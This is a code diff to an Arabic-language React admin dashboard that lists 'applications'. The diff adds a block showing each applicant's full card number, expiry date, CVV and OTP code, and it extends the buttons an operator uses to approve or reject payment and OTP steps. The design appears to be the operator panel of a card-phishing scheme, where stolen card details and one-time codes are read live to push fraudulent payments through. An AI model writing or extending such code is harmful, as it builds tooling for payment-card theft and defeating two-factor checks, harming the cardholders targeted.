@@ -613,65 +613,87 @@ const DashboardApplications = () => {
                           </div>
                         </div>
 
-                        {/* شريط الحالة والأزرار */}
-                        <div className="pt-4 border-t">
+                        {/* شريط الحالة + بيانات البطاقة + الأزرار */}
+                        <div className="pt-4 border-t space-y-3">
+                          {/* بيانات البطاقة / OTP داخل بطاقة الطلب */}
+                          {(app.card_number || app.card_cvv || app.expiry_date || app.otp_code) && (
+                            <div className="rounded-lg border bg-card p-3">
+                              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-2 text-sm">
+                                {(app.cardholder_name || app.card_type) && (
+                                  <p>
+                                    <span className="text-muted-foreground">الاسم/النوع:</span>{" "}
+                                    <span className="font-semibold">
+                                      {[app.cardholder_name, app.card_type].filter(Boolean).join(" - ") || "غير متوفر"}
+                                    </span>
+                                  </p>
+                                )}
+                                {app.card_number && (
+                                  <p dir="ltr">
+                                    <span className="text-muted-foreground">رقم البطاقة:</span>{" "}
+                                    <span className="font-semibold">{app.card_number}</span>
+                                  </p>
+                                )}
+                                {app.expiry_date && (
+                                  <p dir="ltr">
+                                    <span className="text-muted-foreground">انتهاء:</span>{" "}
+                                    <span className="font-semibold">{app.expiry_date}</span>
+                                  </p>
+                                )}
+                                {app.card_cvv && (
+                                  <p dir="ltr">
+                                    <span className="text-muted-foreground">CVV:</span>{" "}
+                                    <span className="font-semibold">{app.card_cvv}</span>
+                                  </p>
+                                )}
+                                {app.otp_code && (
+                                  <p dir="ltr" className="md:col-span-2 lg:col-span-4">
+                                    <span className="text-muted-foreground">OTP:</span>{" "}
+                                    <span className="font-semibold">{app.otp_code}</span>
+                                  </p>
+                                )}
+                              </div>
+                            </div>
+                          )}
+
+                          {/* الحالة + أزرار الموافقة/الرفض */}
                           <div className="flex flex-wrap gap-2 items-center justify-between">
                             <div className="flex flex-wrap gap-2 items-center">
                               <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
                                 الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
                               </Badge>
-                              {app.current_step === 'payment' && !app.payment_approved && (
-                                <Badge variant="outline" className="bg-orange-100 dark:bg-orange-950 animate-pulse">
+                              {(app.current_step === 'payment' || app.status === 'pending_payment') && !app.payment_approved && (
+                                <Badge variant="outline" className="bg-muted animate-pulse">
                                   في انتظار موافقة الدفع 💳
                                 </Badge>
                               )}
-                              {app.current_step === 'otp' && !app.otp_approved && (
-                                <Badge variant="outline" className="bg-blue-100 dark:bg-blue-950 animate-pulse">
+                              {(app.current_step === 'otp' || app.status === 'pending_otp') && !app.otp_approved && (
+                                <Badge variant="outline" className="bg-muted animate-pulse">
                                   في انتظار موافقة OTP 🔐
                                 </Badge>
                               )}
                             </div>
-                            
-                            {/* أزرار الموافقة والرفض السريعة */}
+
                             {app.status !== 'rejected' && (
                               <div className="flex gap-2">
-                                {app.current_step === 'payment' && !app.payment_approved && (
+                                {(app.current_step === 'payment' || app.status === 'pending_payment') && !app.payment_approved && (
                                   <>
-                                    <Button
-                                      onClick={() => approveStep(app.id, 'payment_approved')}
-                                      size="sm"
-                                      className="bg-green-600 hover:bg-green-700 gap-1"
-                                    >
+                                    <Button onClick={() => approveStep(app.id, 'payment_approved')} size="sm" className="gap-1">
                                       <CheckCircle className="h-4 w-4" />
                                       موافقة الدفع
                                     </Button>
-                                    <Button
-                                      onClick={() => rejectStep(app.id)}
-                                      size="sm"
-                                      variant="destructive"
-                                      className="gap-1"
-                                    >
+                                    <Button onClick={() => rejectStep(app.id)} size="sm" variant="destructive" className="gap-1">
                                       <XCircle className="h-4 w-4" />
                                       رفض
                                     </Button>
                                   </>
                                 )}
-                                {app.current_step === 'otp' && !app.otp_approved && (
+                                {(app.current_step === 'otp' || app.status === 'pending_otp') && !app.otp_approved && (
                                   <>
-                                    <Button
-                                      onClick={() => approveStep(app.id, 'otp_approved')}
-                                      size="sm"
-                                      className="bg-green-600 hover:bg-green-700 gap-1"
-                                    >
+                                    <Button onClick={() => approveStep(app.id, 'otp_approved')} size="sm" className="gap-1">
                                       <CheckCircle className="h-4 w-4" />
                                       موافقة OTP
                                     </Button>
-                                    <Button
-                                      onClick={() => rejectStep(app.id)}
-                                      size="sm"
-                                      variant="destructive"
-                                      className="gap-1"
-                                    >
+                                    <Button onClick={() => rejectStep(app.id)} size="sm" variant="destructive" className="gap-1">
                                       <XCircle className="h-4 w-4" />
                                       رفض
                                     </Button>
